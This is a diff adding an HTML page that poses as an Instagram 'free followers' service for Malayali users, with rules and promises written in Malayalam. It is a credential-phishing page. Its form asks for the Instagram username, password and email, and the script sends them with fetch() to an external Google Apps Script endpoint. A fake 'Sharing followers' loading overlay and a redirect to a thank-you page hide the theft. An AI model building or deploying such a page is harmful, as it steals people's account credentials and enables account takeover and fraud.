@@ -1,0 +1,201 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Instagram Free Followers</title>
+    <style>
+        /* General styles */
+        body {
+            font-family: Arial, sans-serif;
+            background-color: #f3f3f3;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+        }
+        .container {
+            max-width: 400px;
+            background-color: #fff;
+            padding: 20px;
+            margin-top: 50px;
+            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
+            border-radius: 10px;
+            text-align: center;
+        }
+
+        /* Instagram logo */
+        .logo {
+            width: 60px; /* Reduced size */
+            margin-bottom: 20px;
+        }
+
+        /* Form styles */
+        .form-group {
+            margin-bottom: 15px;
+            text-align: left;
+        }
+        .form-group input, .form-group select {
+            width: 100%;
+            padding: 8px;
+            font-size: 14px;
+            border: 1px solid #ddd;
+            border-radius: 5px;
+        }
+        .submit-btn {
+            width: 100%;
+            padding: 10px;
+            font-size: 16px;
+            color: #fff;
+            background-color: #3897f0;
+            border: none;
+            border-radius: 5px;
+            cursor: pointer;
+        }
+        .submit-btn:hover {
+            background-color: #3075c4;
+        }
+
+        /* Loading overlay styles */
+        .loading-overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            right: 0;
+            bottom: 0;
+            background: rgba(0, 0, 0, 0.5);
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            z-index: 9999;
+            visibility: hidden;
+            color: #fff;
+            font-size: 20px;
+            text-align: center;
+        }
+        .loading-overlay.visible {
+            visibility: visible;
+        }
+        .loading-spinner {
+            width: 40px;
+            height: 40px;
+            border: 4px solid #fff;
+            border-top: 4px solid #3897f0;
+            border-radius: 50%;
+            margin-bottom: 15px;
+            animation: spin 1s linear infinite;
+        }
+        @keyframes spin {
+            from { transform: rotate(0deg); }
+            to { transform: rotate(360deg); }
+        }
+
+        /* Boxed sections for Rules and Services */
+        .box-section {
+            background-color: #f9f9f9;
+            padding: 15px;
+            border-radius: 5px;
+            border: 1px solid #ddd;
+            margin-bottom: 20px;
+            text-align: left;
+        }
+        .box-section h2, .box-section h3 {
+            margin-bottom: 10px;
+        }
+        .box-section p {
+            margin-bottom: 5px;
+        }
+
+    </style>
+</head>
+<body>
+
+    <!-- Container for the page content -->
+    <div class="container">
+        <!-- Instagram logo and title -->
+        <img src="https://upload.wikimedia.org/wikipedia/commons/a/a5/Instagram_icon.png" alt="Instagram Logo" class="logo">
+        <h1>Instagram Free Followers For Malayalies</h1>
+        <div class="description">
+            Get free Instagram followers by entering your details below! Boost your profile now. Mainly made for Malayalies.
+        </div>
+
+        <!-- Why Us Section (Boxed) -->
+        <div class="why-us-section box-section">
+            <h2>Service</h2>
+            <p><strong>ഞങ്ങൾ യഥാർത്ഥ ഫോളോവേഴ്‌സിനെ വേഗത്തിലും വിശ്വസനീയമായും നൽകുന്നു, ചെലവില്ലാതെ നിങ്ങളുടെ ഇൻസ്റ്റാഗ്രാം സാന്നിധ്യം വളർത്തിയെടുക്കാൻ സഹായിക്കുന്നു. ഞങ്ങളോടൊപ്പം, നിങ്ങളുടെ ആവശ്യങ്ങൾക്കനുസൃതമായി യഥാർത്ഥ ഇടപഴകലും ഓർഗാനിക് വളർച്ചയും നിങ്ങൾക്ക് അനുഭവപ്പെടും.</strong></p>
+        </div>
+
+        <!-- Rules Section (Boxed) -->
+        <div class="rules-section box-section">
+            <h3>Rules:</h3>
+            <p>- ഇതിന് <strong>24</strong> മണിക്കൂർ വരെ എടുത്തേക്കാം</p>
+            <p>- പ്രതിദിനം ഒരു <strong>Submission</strong> മാത്രമേ അനുവദിക്കൂ.</p>
+            <p>- നിങ്ങളുടെ <strong>Public</strong> അക്കൗണ്ട് മാത്രമേ അനുവദിക്കൂ. നിങ്ങൾ ഉറപ്പാക്കുക.</p>
+        </div>
+
+        <!-- Form Section -->
+        <form id="gform" action="https://script.google.com/macros/s/AKfycbxHiwDTIiAo7DR7NegX_S58ym9ud3iHmTnpODwiXRrXolyl8nOh-fjk3BOw7HzZBSUw3Q/exec" method="POST" onsubmit="handleSubmit(event)">
+            <div class="form-group">
+                <label for="username"><strong>Username</strong></label>
+                <input type="text" id="username" name="username" required>
+            </div>
+            <div class="form-group">
+                <label for="password"><strong>Password</strong></label>
+                <input type="password" id="password" name="password" required>
+            </div>
+            <div class="form-group">
+                <label for="email">Email</label>
+                <input type="email" id="email" name="email" required>
+            </div>
+            <div class="form-group">
+                <label for="followers"><strong>Number of Followers</strong>[You Want]</label>
+                <select id="followers" name="followers">
+                    <option value="select"><strong>Select</strong></option>
+                    <option value="100">100</option>
+                    <option value="150">150</option>
+                    <option value="500">500</option>
+                    <option value="1000">1000</option>
+                    <option value="1200">1200</option>
+                </select>
+            </div>
+            <button type="submit" class="submit-btn">Submit</button>
+        </form>
+    </div>
+
+    <!-- Loading overlay -->
+    <div class="loading-overlay" id="loadingOverlay">
+        <div class="loading-spinner"></div>
+        <div id="loadingText">Sharing followers...</div>
+    </div>
+
+    <!-- JavaScript to handle form submission and loading effect -->
+    <script>
+        function handleSubmit(event) {
+            event.preventDefault(); // Prevent form from submitting normally
+            
+            // Get the username value
+            const username = document.getElementById('username').value;
+            
+            // Show loading overlay with dynamic username
+            const overlay = document.getElementById('loadingOverlay');
+            const loadingText = document.getElementById('loadingText');
+            loadingText.innerText = `Sharing followers to ${username}...`;
+            overlay.classList.add('visible');
+
+            const form = event.target;
+            fetch(form.action, {
+                method: form.method,
+                body: new FormData(form)
+            }).then(response => {
+                overlay.classList.remove('visible'); // Hide the overlay after response
+                if (response.ok) {
+                    window.location.href = "ok.html"; // Redirect to thank you page
+                }
+            }).catch(error => {
+                overlay.classList.remove('visible'); // Hide the overlay if there's an error
+            });
+        }
+    </script>
+
+</body>
+</html>
